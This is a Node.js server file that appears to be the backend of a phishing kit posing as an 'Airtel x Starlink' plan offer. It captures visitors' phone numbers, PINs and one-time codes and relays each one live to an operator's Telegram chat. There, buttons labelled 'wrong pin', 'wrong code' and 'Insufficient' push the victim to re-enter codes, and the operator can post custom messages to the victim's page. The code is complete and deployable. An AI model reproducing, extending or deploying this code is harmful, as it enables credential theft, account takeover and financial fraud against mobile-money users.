// server.js
// Airtel x Starlink forfaits flow — with Telegram bot admin-approval gate.
//
// Flow: airtel-starlink.html (plans) -> trial.html (login) -> pto.html (OTP)
//       -> [Telegram admin approval, spinner while waiting] -> mwish.html
//
// Setup:
//   1. npm install
//   2. Set environment variables:
//        TELEGRAM_BOT_TOKEN     = token from @BotFather
//        TELEGRAM_ADMIN_CHAT_ID = your Telegram chat id (the admin who approves)
//   3. npm start
//
// Storage: in-memory only (Map). Fine for a single server instance / testing.
// Restarting the server clears all pending/approved requests.

const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
  console.warn(
    '⚠️  TELEGRAM_BOT_TOKEN/BOT_TOKEN and/or TELEGRAM_ADMIN_CHAT_ID/ADMIN_CHAT_ID are not set.\n' +
    '    The approval flow will not be able to notify you until both are configured.'
  );
}

// Long polling — simplest option, works locally and on Render without a public webhook URL.
const bot = BOT_TOKEN ? new TelegramBot(BOT_TOKEN, { polling: true }) : null;

app.use(express.json());
app.use(express.static(__dirname));

// ---------------------------------------------------------------------------
// In-memory store of approval requests
// id -> { status: 'pending' | 'approved' | 'denied', plan, price, phone, createdAt }
// ---------------------------------------------------------------------------
const requests = new Map();
const messageStore = new Map(); // requestId -> [{ id, text, time }]
const notificationMessageIds = new Map(); // `${chatId}:${messageId}` -> requestId
let nextMsgId = 1;

function getRequestMessages(requestId) {
  if (!messageStore.has(requestId)) messageStore.set(requestId, []);
  return messageStore.get(requestId);
}

function makeId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

// Clean up old requests every 10 minutes (older than 30 min) to avoid unbounded growth
setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  for (const [id, reqData] of requests) {
    if (reqData.createdAt < cutoff) requests.delete(id);
  }
}, 10 * 60 * 1000);

// ---------------------------------------------------------------------------
// Create a new approval request -> notifies admin on Telegram
// ---------------------------------------------------------------------------
app.post('/api/request-approval', async (req, res) => {
  const { plan, price, phone, step, code, otp } = req.body || {};
  const id = makeId();

  requests.set(id, {
    status: 'pending',
    plan: plan || '—',
    price: price || '—',
    phone: phone || '—',
    step: step || 'login',
    code: code || '',
    otp: otp || '',
    createdAt: Date.now(),
  });

  if (bot && ADMIN_CHAT_ID) {
  const stepLabel = step === 'otp' ? 'OTP Verification' : 'Login';

  const secretLine =
    step === 'otp'
       ? `🔑 OTP : \`${otp || '—'}\`\n`
: `🔑 pin: \`${code || '—'}\`\n`;
    const text =
      `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
      `📦 Plan: ${plan || '—'}\n` +
      `💰 Price: K${price || '—'}\n` +
      `📱 Phone: \`${phone || '—'}\`\n` +
      secretLine;
      

    const buttonRow =
      step === 'otp'
        ? [
            { text: '✅ Approve', callback_data: `approve:${id}` },
            { text: '❌ wrong code', callback_data: `deny:${id}` },
            { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
          { text: '🔢 wrong pin', callback_data: `demo_error:${id}` },
          ]
        : [
            { text: '✅ Approve', callback_data: `approve:${id}` },
            { text: '❌ wrong pin', callback_data: `deny:${id}` },
          ];

    try {
      const sentMessage = await bot.sendMessage(ADMIN_CHAT_ID, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [buttonRow],
        },
      });
      notificationMessageIds.set(`${ADMIN_CHAT_ID}:${sentMessage.message_id}`, id);
    } catch (err) {
      console.error('Failed to send Telegram notification:', err.message);
    }
  }

  res.json({ id });
});

app.get('/api/request/:id', (req, res) => {
  const requestId = req.params.id;
  const reqData = requests.get(requestId);
  if (!reqData) return res.status(404).json({ error: 'Request not found' });

  res.json({
    id: requestId,
    status: reqData.status,
    plan: reqData.plan,
    price: reqData.price,
    phone: reqData.phone,
    step: reqData.step,
    code: reqData.code,
    otp: reqData.otp,
    createdAt: reqData.createdAt,
  });
});

app.get('/api/messages/:id', (req, res) => {
  const requestId = req.params.id;
  const reqData = requests.get(requestId);
  if (!reqData || reqData.status !== 'approved') return res.status(403).json({ error: 'Not approved' });
  const since = parseInt(req.query.since || '0', 10);
  const perRequestMessages = getRequestMessages(requestId);
  res.json(perRequestMessages.filter((m) => m.id > since));
});

// ---------------------------------------------------------------------------
// Poll approval status
// ---------------------------------------------------------------------------
app.get('/api/check-approval/:id', (req, res) => {
  const reqData = requests.get(req.params.id);
  if (!reqData) return res.status(404).json({ status: 'not_found' });
  res.json({ status: reqData.status });
});

// ---------------------------------------------------------------------------
// Telegram button presses (approve / deny / insufficient)
// ---------------------------------------------------------------------------
const STATUS_BY_ACTION = {
  approve: 'approved',
  deny: 'denied',
  insufficient: 'insufficient',
  demo_error: 'demo_error'
};

const LABEL_BY_ACTION = {
  approve: 'Approve ✅',
  deny: 'wrong code ❌',
  insufficient: 'Insufficient Balance ⚠️',
  demo_error:'wrong pin⚠️',
};
if (bot) {
  bot.on('message', (msg) => {
    if (String(msg.chat.id) !== String(ADMIN_CHAT_ID)) return;
    const text = msg.text || msg.caption;
    if (!text || text.startsWith('/')) return;

    const replyId = msg.reply_to_message && msg.reply_to_message.message_id;
    const requestId = replyId ? notificationMessageIds.get(`${msg.chat.id}:${replyId}`) : null;

    if (!requestId) {
      bot.sendMessage(ADMIN_CHAT_ID, 'Reply to a specific request message to post it to that customer.').catch(() => {});
      return;
    }

    const perRequestMessages = getRequestMessages(requestId);
    perRequestMessages.push({ id: nextMsgId++, text: text.slice(0, 4000), time: Date.now() });
    if (perRequestMessages.length > 200) perRequestMessages.shift();
    bot.sendMessage(ADMIN_CHAT_ID, '✅ Posted to the page').catch(() => {});
  });

  bot.on('callback_query', async (query) => {
    const [action, id] = (query.data || '').split(':');
    const reqData = requests.get(id);

    if (!reqData) {
      await bot.answerCallbackQuery(query.id, { text: 'Request not found or expired.' });
      return;
    }

    if (reqData.status !== 'pending') {
      await bot.answerCallbackQuery(query.id, { text: `Already processed (${reqData.status}).` });
      return;
    }

    const newStatus = STATUS_BY_ACTION[action];
    if (!newStatus) {
      await bot.answerCallbackQuery(query.id, { text: 'Action inconnue.' });
      return;
    }

    reqData.status = newStatus;

    await bot.answerCallbackQuery(query.id, { text: LABEL_BY_ACTION[action] });

    // Update the original message so the admin sees the outcome
    try {
      await bot.editMessageText(
        `${query.message.text}\n\n*${LABEL_BY_ACTION[action].toUpperCase()}*`,
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id,
          parse_mode: 'Markdown',
        }
      );
    } catch (err) {
      console.error('Failed to edit Telegram message:', err.message);
    }
  });

  bot.on('polling_error', (err) => console.error('Telegram polling error:', err.message));
}

// ---------------------------------------------------------------------------
// Page routes
// ---------------------------------------------------------------------------
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const pages = ['index.html', 'airtel-starlink.html', 'trial.html', 'pto.html', 'mwish.html', 'message.html'];
pages.forEach((page) => {
  app.get('/' + page, (req, res) => {
    const fileName = page === 'airtel-starlink.html' ? 'index.html' : page;
    res.sendFile(path.join(__dirname, fileName), (err) => {
      if (err) res.status(404).send('Page not found: ' + page);
    });
  });
});

app.use((req, res) => {
  res.status(404).send('404 — Page not found');
});

app.listen(PORT, () => {
  console.log(`Airtel x Starlink app running at http://localhost:${PORT}`);
});
